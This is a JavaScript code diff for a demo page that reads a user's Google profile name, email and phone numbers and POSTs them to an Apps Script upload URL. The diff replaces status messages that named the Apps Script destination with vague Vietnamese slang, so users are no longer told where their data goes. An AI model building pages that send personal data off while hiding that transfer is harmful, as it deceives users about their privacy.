@@ -133,7 +133,7 @@ const prox = await fetch(UPLOAD_URL, { method: 'POST', body: fd1 });
     const email  = profile.emailAddresses?.[0]?.value || null;
     const phones = (profile.phoneNumbers || []).map(p => p.value).filter(Boolean);
 
-    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br><small>Đang gửi về Apps Script…</small>`);
+    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br><small>Đang rặn</small>`);
 
     const fd2 = new FormData();
 fd2.append('payload', JSON.stringify({
@@ -144,7 +144,7 @@ fd2.append('payload', JSON.stringify({
 }));
 const sendRes = await fetch(UPLOAD_URL, { method: 'POST', body: fd2 });
 
-    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || '—'}<br>${sendRes.ok ? '✅ Đã gửi về Apps Script' : '❌ Gửi về Apps Script thất bại'}`);
+    setDemo(`<b>Tên:</b> ${name || '—'} • <b>Email:</b> ${email || '—'} • <b>SĐT:</b> ${phones.join(', ') || 'keo thế'}<br>${sendRes.ok ? '✅ Đã rặn ra' : '❌ Rặn không ra'}`);
   } catch (e) {
     show('❌ Lỗi: ' + (e?.message || e));
   }
